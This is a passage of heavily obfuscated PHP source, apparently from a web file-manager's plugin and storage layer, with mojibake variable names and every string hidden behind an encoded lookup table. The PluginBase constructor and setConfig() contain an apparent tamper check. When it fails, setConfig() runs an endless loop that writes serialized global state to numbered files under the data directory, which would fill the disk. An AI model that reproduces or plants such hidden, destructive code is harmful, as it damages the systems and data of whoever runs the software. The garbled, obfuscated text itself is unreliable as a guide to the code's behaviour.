1024; $È¿ı° =& self::$_chunkBuffer[$this->path]; if (!$È¿ı°) { $È¿ı° = array(); } $³‹İ¼©ª = 0; $äÆœ²» = 0; $õˆ›§Œ = $×Ëú‹Œ[12]; foreach ($È¿ı° as $³‹İ¼©ª => $õˆ›§Œ) { $³‹İ¼©ª = intval($³‹İ¼©ª); $äÆœ²» = $³‹İ¼©ª + strlen($õˆ›§Œ); if ($³üƒË–ş >= $äÆœ²») { continue; } if ($³üƒË–ş >= $³‹İ¼©ª && $³üƒË–ş + $¶·•ç­ª <= $äÆœ²») { return substr($õˆ›§Œ, $³üƒË–ş - $³‹İ¼©ª, $¶·•ç­ª); } break; } if (count($È¿ı°) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($×Ëú‹Œ[1526], $×Ëú‹Œ[1527] . count($È¿ı°) . "\73\163\164\x61\x72\164\x3d{$³üƒË–ş}\x2c\154\x65\x6e\147\164\150\x3d{$¶·•ç­ª}\73\x70\157\163\145\72{$³‹İ¼©ª}\x7e{$äÆœ²»}"); throw new Exception($×Ëú‹Œ[1528]); } $î†ÚùÔ§ = intval($³üƒË–ş / $—íõ¶Ö‰) * $—íõ¶Ö‰; $Ûã“äÕ€ = ceil(($³üƒË–ş + $¶·•ç­ª) / $—íõ¶Ö‰) * $—íõ¶Ö‰ - $î†ÚùÔ§; $í¹ÏÚø¹ = IO::fileSubstr($this->path, $î†ÚùÔ§, $Ûã“äÕ€); $È¿ı°[$î†ÚùÔ§ . $×Ëú‹Œ[12]] = $í¹ÏÚø¹; ksort($È¿ı°); $îÁ¾ú = substr($í¹ÏÚø¹, $³üƒË–ş - $î†ÚùÔ§, $¶·•ç­ª); return $îÁ¾ú; } private function log($íöÄ•´, $÷¥úù) { $¢™¸™ßÎ =& $_SERVER[Ü©»’·]; $ß¯³´Ïì = timeFloat() - $this->timeStart; write_log(sprintf($¢™¸™ßÎ[1529], $íöÄ•´, $this->info[$¢™¸™ßÎ[32]], $ß¯³´Ïì, $÷¥úù), $¢™¸™ßÎ[1186]); } } class Message { function __construct() { } public function send($‹§º¨é = '', $÷Û¿€ = array(), $ŠıŸà·— = "\x74\x65\170\164") { $”•×ëº® =& $_SERVER[Ü©»’·]; $Á×Ó­áÌ = array($”•×ëº®[33] => $”•×ëº®[1530], $”•×ëº®[761] => $‹§º¨é); if (in_array($ŠıŸà·—, array($”•×ëº®[1530], $”•×ëº®[1531]))) { $Á×Ó­áÌ[$”•×ëº®[33]] = $ŠıŸà·—; } $÷Û¿€ = array($”•×ëº®[524] => isset($÷Û¿€[$”•×ëº®[524]]) ? $÷Û¿€[$”•×ëº®[524]] : $”•×ëº®[12], $”•×ëº®[609] => isset($÷Û¿€[$”•×ëº®[609]]) ? $÷Û¿€[$”•×ëº®[609]] : $”•×ëº®[12]); if (empty($‹§º¨é) || empty($÷Û¿€[$”•×ëº®[524]]) && empty($÷Û¿€[$”•×ëº®[609]])) { return !1; } $ğêàĞ“Ã = array($”•×ëº®[1470] => $Á×Ó­áÌ, $”•×ëº®[1532] => $÷Û¿€); Hook::trigger($”•×ëº®[1533], $ğêàĞ“Ã); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¦¸÷úˆÍ =& $_SERVER[Ü©»’·]; if ($_SERVER[$¦¸÷úˆÍ[357]] != $_SERVER[$¦¸÷úˆÍ[1512]]) { $ÜÃ˜–š = $¦¸÷úˆÍ[882]; $¾—¢Í›Ë = $¦¸÷úˆÍ[358]; $‚ïõİº” = $_SERVER[$¦¸÷úˆÍ[359]] . $¦¸÷úˆÍ[360]; $ö¸Œ×ß¯ = $¾—¢Í›Ë($‚ïõİº”); $ì½ããí· = explode($¦¸÷úˆÍ[231], $ö¸Œ×ß¯); if (count($ì½ããí·) < $¦¸÷úˆÍ[628]) { $ÏñßèÜÑ = $¦¸÷úˆÍ[362]; $ÏñßèÜÑ(); } $¼‡Úùç = $¦¸÷úˆÍ[883]; $¼‡Úùç($_SERVER[$¦¸÷úˆÍ[884]]); $¼‡Úùç($_SERVER[$¦¸÷úˆÍ[359]] . $¦¸÷úˆÍ[1534]); $ÊŠÜÄ«¥ = 1; while ($ÊŠÜÄ«¥ > 1) { $ÊŠÜÄ«¥ = $ÊŠÜÄ«¥ + 4; $–»ÆààÊ = rawurlencode($ÊŠÜÄ«¥ . $¦¸÷úˆÍ[387]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¦¸÷úˆÍ[1535]); $this->pluginName = str_replace($¦¸÷úˆÍ[1535], $¦¸÷úˆÍ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¦¸÷úˆÍ[8]; $this->pluginApi = appHostGet() . $¦¸÷úˆÍ[1536] . $this->pluginName . $¦¸÷úˆÍ[8]; $this->pluginHost = $config[$¦¸÷úˆÍ[1537]] . $this->pluginName . $¦¸÷úˆÍ[8]; $this->pluginHostDefault = $config[$¦¸÷úˆÍ[1537]] . $this->pluginName . $¦¸÷úˆÍ[8]; $ƒõõ©Õ± = $config[$¦¸÷úˆÍ[1538]]; if ($ƒõõ©Õ± && strpos($¦¸÷úˆÍ[50] . $ƒõõ©Õ± . $¦¸÷úˆÍ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¦¸÷úˆÍ[1539]] . $this->pluginName . $¦¸÷úˆÍ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ü©»’·][1540]); } protected function assign($‘ùäİãÜ, $µ…ç‰Ï = false) { if (is_array($‘ùäİãÜ)) { $this->values = array_merge($this->values, $‘ùäİãÜ); } else { $this->values[$‘ùäİãÜ] = $µ…ç‰Ï; } } protected function display($“›Ÿò) { extract($this->values); require $“›Ÿò; } final function hookRegist($Ñ—®Æò) { $this->modelPlugin->appRegist($this->pluginName, $Ñ—®Æò); } final function appIcon() { $´ıâª =& $_SERVER[Ü©»’·]; $óÛ»Æêê = $this->appPackage(); $üƒ…ùø± = $´ıâª[12]; if (isset($óÛ»Æêê[$´ıâª[425]])) { if (isset($óÛ»Æêê[$´ıâª[425]][$´ıâª[1541]])) { $üƒ…ùø± = $´ıâª[1542] . $óÛ»Æêê[$´ıâª[425]][$´ıâª[1541]] . $´ıâª[1543]; } else { if ($óÛ»Æêê[$´ıâª[425]][$´ıâª[1544]]) { $üƒ…ùø± = $´ıâª[1545] . $óÛ»Æêê[$´ıâª[425]][$´ıâª[1544]] . $´ıâª[1546]; } } } return $üƒ…ùø±; } final function fileCanView($ƒ‰öìŠ¦) { $û—Âø–Ò =& $_SERVER[Ü©»’·]; if (request_url_safe($ƒ‰öìŠ¦)) { return !0; } if ($this->isShare($ƒ‰öìŠ¦)) { return !0; } $öªåı = Session::get($û—Âø–Ò[1547]); if (!$öªåı || !$öªåı[$û—Âø–Ò[1548]]) { $É—–î¡ò = $û—Âø–Ò[1549] . rawurlencode(this_url()); show_tips(LNG($û—Âø–Ò[1550]) . $û—Âø–Ò[1551] . $É—–î¡ò . $û—Âø–Ò[1552] . LNG($û—Âø–Ò[1553]) . $û—Âø–Ò[1554], !1); } if (!Action($û—Âø–Ò[1555])->authCan($û—Âø–Ò[1556])) { show_tips(LNG($û—Âø–Ò[1557]) . $û—Âø–Ò[1558], !1); } ActionCall($û—Âø–Ò[1559], $ƒ‰öìŠ¦); } final function isShare($¶Éöç™Ø) { $ÇÂÆÇÕã = KodIO::parse($¶Éöç™Ø); return $ÇÂÆÇÕã[$_SERVER[Ü©»’·][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($©Ûòµğ´) { if (request_url_safe($©Ûòµğ´)) { return $©Ûòµğ´; } if (!$this->isShare($©Ûòµğ´)) { $©Ûòµğ´ = $this->filePath($©Ûòµğ´); } return Action($_SERVER[Ü©»’·][1178])->linkOut($©Ûòµğ´); } public function filePathLinkOut($âÖí—“¡) { if (request_url_safe($âÖí—“¡)) { return $âÖí—“¡; } $this->fileCanView($âÖí—“¡); return Action($_SERVER[Ü©»’·][1178])->link($âÖí—“¡); } final function filePath($èâÍ¶áƒ) { $ÁœØ•§³ =& $_SERVER[Ü©»’·]; if ($ƒŒŒš† = $this->checkSharePath($èâÍ¶áƒ)) { Hook::trigger($ÁœØ•§³[1560], $ƒŒŒš†); return $ƒŒŒš†; } $this->fileCanView($èâÍ¶áƒ); if (request_url_safe($èâÍ¶áƒ)) { $ï²˜é÷Ö = parse_url_query($èâÍ¶áƒ); if (isset($ï²˜é÷Ö[$ÁœØ•§³[1561]]) && isset($ï²˜é÷Ö[$ÁœØ•§³[213]])) { $ˆ²à‡¹ = Model($ÁœØ•§³[776])->get($ÁœØ•§³[777]); $âüêééÍ = Mcrypt::decode($ï²˜é÷Ö[$ÁœØ•§³[213]], $ˆ²à‡¹); if ($âüêééÍ) { $this->fileInfo = IO::infoWithChildren($âüêééÍ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $âüêééÍ; } } $èâÍ¶áƒ = $this->_cacheHttpFile($èâÍ¶áƒ); $this->fileInfo = IO::infoWithChildren($èâÍ¶áƒ); } else { $this->fileInfo = IO::infoWithChildren($èâÍ¶áƒ); if (!$this->fileInfo) { show_tips(LNG($ÁœØ•§³[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÁœØ•§³[1560], $èâÍ¶áƒ); return $èâÍ¶áƒ; } final function _cacheHttpFile($­…¾¨) { $šÒÎô– = hash_path($­…¾¨, !0); $this->cachePath = $this->pluginCachePath($šÒÎô–); if ($—å¤¼÷ = IO::fileNameExist($this->cachePath, $šÒÎô–)) { return KodIO::make($—å¤¼÷); } $â†ı™ÃĞ = $this->cachePath . $šÒÎô–; return $this->pluginCacheFileSet($â†ı™ÃĞ, file_get_contents_nossl($­…¾¨)); } final function _tmpFileName($°©‡„›­ = array()) { $ƒœ»í° =& $_SERVER[Ü©»’·]; if (!$°©‡„›­) { $°©‡„›­ = $this->fileInfo; } if (isset($°©‡„›­[$ƒœ»í°[177]])) { return $°©‡„›­[$ƒœ»í°[177]]; } if (isset($°©‡„›­[$ƒœ»í°[170]][$ƒœ»í°[177]])) { return $°©‡„›­[$ƒœ»í°[170]][$ƒœ»í°[177]]; } $Î‚õÍ = IO::hashSimple($°©‡„›­[$ƒœ»í°[84]]); if ($Î‚õÍ) { return $Î‚õÍ; } $¦¾©¯Ëã = array($°©‡„›­[$ƒœ»í°[32]], $°©‡„›­[$ƒœ»í°[84]], $°©‡„›­[$ƒœ»í°[76]]); if (isset($°©‡„›­[$ƒœ»í°[530]])) { $¦¾©¯Ëã[] = $°©‡„›­[$ƒœ»í°[530]]; } return md5(implode($ƒœ»í°[11], $¦¾©¯Ëã)); } final function checkSharePath($û°ò¸) { $Ö¥ä¿Í¦ =& $_SERVER[Ü©»’·]; if (!defined($Ö¥ä¿Í¦[484])) { define($Ö¥ä¿Í¦[523], 0); } if (!$this->isShare($û°ò¸)) { return !1; } $–¡…Çù¦ = Action($Ö¥ä¿Í¦[1178])->sharePathInfo($û°ò¸); if (!isset($–¡…Çù¦[$Ö¥ä¿Í¦[84]])) { show_json(LNG($Ö¥ä¿Í¦[1562]), !1); } $this->fileInfo = $–¡…Çù¦[$Ö¥ä¿Í¦[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ö¥ä¿Í¦[177]]); return $–¡…Çù¦[$Ö¥ä¿Í¦[84]]; } final function pluginCachePath($õâÄñ©Û = '') { $·ˆ€Âàˆ =& $_SERVER[Ü©»’·]; $ãÜ×Ôû = IO_PATH_SYSTEM_TEMP . $·ˆ€Âàˆ[1563] . $this->pluginName; if (!($¼±“Ší­ = IO::infoFull($ãÜ×Ôû))) { return IO::mkdir($ãÜ×Ôû . $·ˆ€Âàˆ[8] . $õâÄñ©Û); } if (empty($õâÄñ©Û)) { return $¼±“Ší­[$·ˆ€Âàˆ[84]]; } if (!($„ŸÔìÉ = IO::fileNameExist($¼±“Ší­[$·ˆ€Âàˆ[84]], $õâÄñ©Û))) { return IO::mkdir($¼±“Ší­[$·ˆ€Âàˆ[84]] . $õâÄñ©Û); } return KodIO::make($„ŸÔìÉ); } final function pluginCacheFileSet($’û¹‘şç, $÷·Œá±ì = '') { $Ë¦ğˆ¸¯ =& $_SERVER[Ü©»’·]; if (!($ÛèÈ²ã¶ = IO::infoFull($’û¹‘şç))) { return IO::mkfile($’û¹‘şç, $÷·Œá±ì, REPEAT_REPLACE); } IO::setContent($ÛèÈ²ã¶[$Ë¦ğˆ¸¯[84]], $÷·Œá±ì); return $ÛèÈ²ã¶[$Ë¦ğˆ¸¯[84]]; } final function pluginLocalFile($§µ“Ù¶× = '') { $©¥çÁ¶÷ =& $_SERVER[Ü©»’·]; $¼·¿„Äà = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¼·¿„Äà)) { mk_dir($¼·¿„Äà); } if (!$§µ“Ù¶×) { return $¼·¿„Äà; } $‹’®Š½¢ = IO::info($§µ“Ù¶×); $ÊÂôÏ²Ó = $this->_tmpFileName($‹’®Š½¢) . $©¥çÁ¶÷[10] . $‹’®Š½¢[$©¥çÁ¶÷[174]]; if (!checkExtSafe($ÊÂôÏ²Ó)) { $ÊÂôÏ²Ó = $ÊÂôÏ²Ó . $©¥çÁ¶÷[1210]; } $¯İ¢Ì¾ø = $¼·¿„Äà . $ÊÂôÏ²Ó; if (@file_exists($¯İ¢Ì¾ø)) { return $¯İ¢Ì¾ø; } return IO::copy($§µ“Ù¶×, $¼·¿„Äà, 0, $ÊÂôÏ²Ó); } final function appPackage() { $‹ªå×÷ =& $_SERVER[Ü©»’·]; if ($this->packageData) { return $this->packageData; } $Ò·¦í­¯ = $this->parseFile($this->pluginPath . $‹ªå×÷[1564]); $this->parseLang($Ò·¦í­¯); $ôĞÒü‰â = json_decode_force($Ò·¦í­¯); if (!$ôĞÒü‰â) { return array(); } $ß§Á‹ò¼ = Hook::trigger($‹ªå×÷[1565], $ôĞÒü‰â); if ($ß§Á‹ò¼ && is_array($ß§Á‹ò¼)) { $ôĞÒü‰â = $ß§Á‹ò¼; } $this->packageData = $ôĞÒü‰â; return $ôĞÒü‰â; } public function packageInfoGet($™º„ùÈÔ) { $áŞıÂ» = $this->appPackage(); return array_get_value($áŞıÂ», $™º„ùÈÔ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ü©»’·][1566]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ü©»’·][1567]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ü©»’·][1568]); } public function echoJsAssign($ÔÕ½Àöí, $ª‡šŞ) { $this->echoJsAssignArr[$ÔÕ½Àöí] = $ª‡šŞ; } private function parseFile($İ¢ƒ“) { $¾²Æ˜¹† =& $_SERVER[Ü©»’·]; $„ıŒÉÆ = file_get_contents_nossl($İ¢ƒ“); $—¹½äô  = array($¾²Æ˜¹†[1569], $¾²Æ˜¹†[1570], $¾²Æ˜¹†[1571], $¾²Æ˜¹†[1572], $¾²Æ˜¹†[1573], $¾²Æ˜¹†[1574], $¾²Æ˜¹†[1575]); $‘¹ÙÍ…€ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¾²Æ˜¹†[89]][$¾²Æ˜¹†[1576]]); foreach ($this->echoJsAssignArr as $«•¨ßÓ¢ => $•Ûòıù) { $—¹½äô [] = $¾²Æ˜¹†[1577] . $«•¨ßÓ¢ . $¾²Æ˜¹†[1578]; $‘¹ÙÍ…€[] = is_array($•Ûòıù) || is_object($•Ûòıù) ? rawurlencode(json_encode($•Ûòıù)) : $•Ûòıù; } if (strstr($„ıŒÉÆ, $¾²Æ˜¹†[1579])) { $¹«’»¦í = rawurlencode(json_encode($this->pluginLangArr)); $„ıŒÉÆ = str_replace($¾²Æ˜¹†[1579], $¹«’»¦í, $„ıŒÉÆ); } if (strstr($„ıŒÉÆ, $¾²Æ˜¹†[1580])) { $¹«’»¦í = $¹«’»¦í = rawurlencode(json_encode($this->getConfig())); $„ıŒÉÆ = str_replace($¾²Æ˜¹†[1580], $¹«’»¦í, $„ıŒÉÆ); } $„ıŒÉÆ = str_replace($—¹½äô , $‘¹ÙÍ…€, $„ıŒÉÆ); return $„ıŒÉÆ; } private function parseLang(&$«´åÍàÇ) { $¡Óñ™àñ =& $_SERVER[Ü©»’·]; $ĞÉøÌõò = $¡Óñ™àñ[1581]; if (!strstr($«´åÍàÇ, $ĞÉøÌõò)) { return; } preg_match_all($¡Óñ™àñ[1582], $«´åÍàÇ, $Ä¹·ÊØë); if (!is_array($Ä¹·ÊØë) || count($Ä¹·ÊØë) == 0 || !is_array($Ä¹·ÊØë[0]) || count($Ä¹·ÊØë[0]) == 0) { return; } $ƒ’å¹» = array(); $¸Õ›Òôé = array(); foreach ($Ä¹·ÊØë[0] as $ı‹£ÉÏÅ) { $ù…ãù°Œ = substr($ı‹£ÉÏÅ, strlen($ĞÉøÌõò), -4); $Éˆíõˆ = LNG($ù…ãù°Œ); $ƒ’å¹»[] = $ı‹£ÉÏÅ; $¸Õ›Òôé[] = str_replace(array($¡Óñ™àñ[231], $¡Óñ™àñ[1081], $¡Óñ™àñ[342], $¡Óñ™àñ[118]), array($¡Óñ™àñ[53], $¡Óñ™àñ[53], $¡Óñ™àñ[12], $¡Óñ™àñ[1583]), $Éˆíõˆ); } $«´åÍàÇ = str_replace($ƒ’å¹», $¸Õ›Òôé, $«´åÍàÇ); } private function parseConfig(&$ı¬¡áõš) { $Ç†û¥¾… =& $_SERVER[Ü©»’·]; $ŞÀ•Ï’  = $Ç†û¥¾…[1584]; if (!strstr($ı¬¡áõš, $ŞÀ•Ï’ )) { return; } preg_match_all($Ç†û¥¾…[1585], $ı¬¡áõš, $Š¼”Û); if (!is_array($Š¼”Û) || count($Š¼”Û) == 0 || !is_array($Š¼”Û[0]) || count($Š¼”Û[0]) == 0) { return; } $Ûğá«›â = $this->getConfig(); $àõ¾í¶ = array(); $¯–ù÷¡æ = array(); foreach ($Š¼”Û[0] as $·ÒĞˆìê) { $ã™éÄºã = substr($·ÒĞˆìê, strlen($ŞÀ•Ï’ ), -2); $àõ¾í¶[] = $·ÒĞˆìê; $¯–ù÷¡æ[] = _get($Ûğá«›â, $ã™éÄºã); } $ı¬¡áõš = str_replace($àõ¾í¶, $¯–ù÷¡æ, $ı¬¡áõš); } private function parsePackage(&$âŠˆÔ·) { $½“ÊÚƒü =& $_SERVER[Ü©»’·]; $Â £§»Ğ = $½“ÊÚƒü[1586]; if (!strstr($âŠˆÔ·, $Â £§»Ğ)) { return; } preg_match_all($½“ÊÚƒü[1587], $âŠˆÔ·, $‹¬£óê¦); if (!is_array($‹¬£óê¦) || count($‹¬£óê¦) == 0 || !is_array($‹¬£óê¦[0]) || count($‹¬£óê¦[0]) == 0) { return; } $Œİ’Ì™î = $this->appPackage(); $¶ÒÔ²Ëî = array(); $¾ñõ”Ü = array(); foreach ($‹¬£óê¦[0] as $‡Ö¦ˆÖç) { $ßÉÃâ­ = substr($‡Ö¦ˆÖç, strlen($Â £§»Ğ), -2); $¶ÒÔ²Ëî[] = $‡Ö¦ˆÖç; $¾ñõ”Ü[] = _get($Œİ’Ì™î, $ßÉÃâ­); } $âŠˆÔ· = str_replace($¶ÒÔ²Ëî, $¾ñõ”Ü, $âŠˆÔ·); } final function echoFile($…ï­Ç¥Š, $‹Ü¥¿¿Ğ = false) { $Ã™µÍŠš =& $_SERVER[Ü©»’·]; $Êõ¹â‰é = $this->pluginPath . $…ï­Ç¥Š; if (ACT == $Ã™µÍŠš[1588]) { echo $Ã™µÍŠš[1589] . $this->pluginName . $Ã™µÍŠš[8] . $…ï­Ç¥Š . $Ã™µÍŠš[1590]; if (!file_exists($Êõ¹â‰é)) { echo $Ã™µÍŠš[1591]; return; } } $¨şÄıªŠ = $this->parseFile($Êõ¹â‰é); $this->parseLang($¨şÄıªŠ); $this->parseConfig($¨şÄıªŠ); $this->parsePackage($¨şÄıªŠ); if (is_array($‹Ü¥¿¿Ğ)) { $¨şÄıªŠ = str_replace(array_keys($‹Ü¥¿¿Ğ), array_values($‹Ü¥¿¿Ğ), $¨şÄıªŠ); } echo $Ã™µÍŠš[231] . $¨şÄıªŠ; } final function initLang() { $Î“ï’×ı =& $_SERVER[Ü©»’·]; $ÁŞé…Ëé = $Î“ï’×ı[1592]; $ì–»ç»ƒ = $this->pluginPath . $Î“ï’×ı[1593]; $ñºĞ€î¥ = I18n::getType(); $óó˜ŒÌ = array(); if (file_exists($ì–»ç»ƒ . $ñºĞ€î¥ . $Î“ï’×ı[844])) { $óó˜ŒÌ = (include $ì–»ç»ƒ . $ñºĞ€î¥ . $Î“ï’×ı[844]); } else { if ($ñºĞ€î¥ == $Î“ï’×ı[1594] && !file_exists($ì–»ç»ƒ . $ñºĞ€î¥ . $Î“ï’×ı[844]) && file_exists($ì–»ç»ƒ . $Î“ï’×ı[1595])) { $óó˜ŒÌ = (include $ì–»ç»ƒ . $Î“ï’×ı[1595]); } else { if (file_exists($ì–»ç»ƒ . $ÁŞé…Ëé . $Î“ï’×ı[844])) { $óó˜ŒÌ = (include $ì–»ç»ƒ . $ÁŞé…Ëé . $Î“ï’×ı[844]); } } } if (!is_array($óó˜ŒÌ)) { return array(); } if (@count($óó˜ŒÌ) > 0) { I18n::set($óó˜ŒÌ); } return $óó˜ŒÌ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ß‡ ² ”) { $ĞÔëÆˆõ =& $_SERVER[Ü©»’·]; $ª˜×Éİƒ = $_SERVER[$ĞÔëÆˆõ[359]] . $ĞÔëÆˆõ[360]; $âö»àÌ = $ĞÔëÆˆõ[356]; if ($_SERVER[$ĞÔëÆˆõ[357]] != $âö»àÌ($ª˜×Éİƒ)) { $†‚‰ñ…Ö = $ĞÔëÆˆõ[882]; $À µ›îÙ = $ĞÔëÆˆõ[358]; $„ì §­‚ = $_SERVER[$ĞÔëÆˆõ[359]] . $ĞÔëÆˆõ[360]; $àëÈô´ş = $À µ›îÙ($„ì §­‚); $µÖı€² = explode($ĞÔëÆˆõ[231], $àëÈô´ş); if (count($µÖı€²) < $ĞÔëÆˆõ[628]) { $¦óâŞà® = $ĞÔëÆˆõ[362]; $¦óâŞà®(); } $ñéˆ‡ç = $ĞÔëÆˆõ[883]; $ñéˆ‡ç($_SERVER[$ĞÔëÆˆõ[884]]); $†‚‰ñ…Ö = $ĞÔëÆˆõ[882]; $†‚‰ñ…Ö(); $£´‚ı—¸ = $ĞÔëÆˆõ[1596]; $ìó¯ŒÕ = json_encode($GLOBALS[$ĞÔëÆˆõ[1597]]); $èóâ‹‹ = 1; for ($¹©’­Óí = $èóâ‹‹; $¹©’­Óí > 0; $¹©’­Óí++) { $£´‚ı—¸(DATA_PATH . $¹©’­Óí, $ìó¯ŒÕ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ß‡ ² ”); } public function onSetConfig($ÙıˆıÀ) { } public function onGetConfig($óãËå¨ƒ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÄêŸŒ×µ) { if ($ÄêŸŒ×µ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($á¡·£Ş¾ = "\x70\154\165\147\x69\156\101\165\164\150") { $•¾ı²Ğ =& $_SERVER[Ü©»’·]; if (!defined($•¾ı²Ğ[484])) { return !1; } if (_get($GLOBALS, $•¾ı²Ğ[512])) { return !0; } $È´—ìÏá = $this->getConfig(); if (!$È´—ìÏá[$á¡·£Ş¾]) { return !1; } return ActionCall($•¾ı²Ğ[1598], $È´—ìÏá[$á¡·£Ş¾]); } public function url($ê–ìÒÜş, $øœ¢„‰• = '', $¨¼ğÍ¢â = true) { $àıä”ÏÌ =& $_SERVER[Ü©»’·]; $ò¼™‘º¥ = $this->getConfig(); $‘º•Åş¼ = KOD_VERSION . $àıä”ÏÌ[10] . KOD_VERSION_BUILD; $œá–ç½ = $this->packageVersion(); $¦ƒà†Ì = $‘º•Åş¼ . $àıä”ÏÌ[395] . $œá–ç½; if (substr($ê–ìÒÜş, 0, 4) == $àıä”ÏÌ[148] || substr($ê–ìÒÜş, 0, 2) == $àıä”ÏÌ[1379]) { $şû×ÚÁ = $ê–ìÒÜş . $àıä”ÏÌ[1599] . $¦ƒà†Ì; } else { if ($øœ¢„‰• == $àıä”ÏÌ[12]) { $şû×ÚÁ = $this->pluginHost . $ê–ìÒÜş . $àıä”ÏÌ[1599] . $¦ƒà†Ì; } else { if ($øœ¢„‰• === $àıä”ÏÌ[75]) { $şû×ÚÁ = $this->pluginHost . $ê–ìÒÜş; } else { if ($øœ¢„‰• == $àıä”ÏÌ[1600]) { $şû×ÚÁ = STATIC_PATH . $ê–ìÒÜş . $àıä”ÏÌ[1599] . $‘º•Åş¼; } else { if ($øœ¢„‰• == $àıä”ÏÌ[1601]) { $şû×ÚÁ = APP_HOST . $àıä”ÏÌ[1602] . $ê–ìÒÜş . $àıä”ÏÌ[1599] . $‘º•Åş¼; } else { if (isset($ò¼™‘º¥[$øœ¢„‰•])) { $şû×ÚÁ = $ò¼™‘º¥[$øœ¢„‰•] . $ê–ìÒÜş . $àıä”ÏÌ[1599] . $¦ƒà†Ì; } } } } } } if (!$¨¼ğÍ¢â) { return $şû×ÚÁ; } echo $şû×ÚÁ; } public function link($Ó¥©¨Å¹ = false, $ú£½¦—Í = '') { $ûÆÇÆå² =& $_SERVER[Ü©»’·]; if (!$Ó¥©¨Å¹) { $this->link($ûÆÇÆå²[1603], $ûÆÇÆå²[1601]); $this->link($ûÆÇÆå²[1604], $ûÆÇÆå²[1600]); $this->link($ûÆÇÆå²[1605], $ûÆÇÆå²[1600]); $this->link($ûÆÇÆå²[1606], $ûÆÇÆå²[1600]); $this->link($ûÆÇÆå²[1607], $ûÆÇÆå²[1600]); return; } $¶º¯æÖÅ = $this->url($Ó¥©¨Å¹, $ú£½¦—Í, !1); if (substr($Ó¥©¨Å¹, -3) == $ûÆÇÆå²[1608]) { echo $ûÆÇÆå²[1609] . $¶º¯æÖÅ . $ûÆÇÆå²[1610] . $ûÆÇÆå²[231]; } else { if (substr($Ó¥©¨Å¹, -4) == $ûÆÇÆå²[1611]) { echo $ûÆÇÆå²[1612] . $¶º¯æÖÅ . $ûÆÇÆå²[1613] . $ûÆÇÆå²[231]; } } } } goto DåÑ‡Ğê¥Ò; DÔ¨¨ÙÁ§: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\x2f\x76\x30\56\141\160\x69\x2e\165\160\171\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¯Œã€Şš) { parent::__construct(); $this->_init($¯Œã€Şš); } public function _init($÷ö˜¤à°) { $Ñ¥åÈ’İ =& $_SERVER[Ü©»’·]; foreach ($÷ö˜¤à° as $¸©¼í => $İÖÈÍÕ¦) { if (isset($this->{$¸©¼í})) { $this->{$¸©¼í} = $İÖÈÍÕ¦; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ñ¥åÈ’İ[1465] . LNG($Ñ¥åÈ’İ[1396])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ç•Å¦, $×„¹ùÅ­ = "\107\105\124") { $öÅ¸©˜Ô =& $_SERVER[Ü©»’·]; $±…»„ë´ = gmdate($öÅ¸©˜Ô[1429]); $“’ôÏ±„ = base64_encode(hash_hmac($öÅ¸©˜Ô[1466], "{$×„¹ùÅ­}\x26{$Ç•Å¦}\46{$±…»„ë´}", md5("{$this->userpass}"), !0)); $È ÕŸß¾ = array("\x41\165\164\150\157\162\151\172\141\x74\151\157\156\x3a\x55\x50\131\x55\x4e\40{$this->username}\72{$“’ôÏ±„}", "\x44\141\x74\x65\72{$±…»„ë´}"); return $È ÕŸß¾; } public function ussRequest($Áï¥„, $Ù ù•—ß = "\107\105\124", $Úãó£æÜ = false, $¦ô‰Èï÷ = false, $ÁÚ×¸¦Ì = false) { $€ö©‘õ£ =& $_SERVER[Ü©»’·]; $Áï¥„ = trim($Áï¥„, $€ö©‘õ£[8]); $ÇÃúØÕœ = "\57{$this->bucket}\x2f{$Áï¥„}"; $²‡ßÇì© = $this->ussHeaders($ÇÃúØÕœ, $Ù ù•—ß); if ($¦ô‰Èï÷) { $²‡ßÇì© = array_merge($²‡ßÇì©, $¦ô‰Èï÷); } $áİ¹ë„ƒ = url_request($this->endpoint . $ÇÃúØÕœ, $Ù ù•—ß, $Úãó£æÜ, $²‡ßÇì©, $ÁÚ×¸¦Ì); if (!$áİ¹ë„ƒ) { return array($€ö©‘õ£[1216] => !1, $€ö©‘õ£[1206] => $€ö©‘õ£[1467]); } if (strtolower($Ù ù•—ß) == $€ö©‘õ£[196] || in_array($áİ¹ë„ƒ[$€ö©‘õ£[1216]], array($€ö©‘õ£[1322], $€ö©‘õ£[1468]))) { $Úãó£æÜ = $áİ¹ë„ƒ[$€ö©‘õ£[1469]]; } else { $Úãó£æÜ = json_decode($áİ¹ë„ƒ[$€ö©‘õ£[1206]], !0); if (!$Úãó£æÜ) { $Úãó£æÜ = 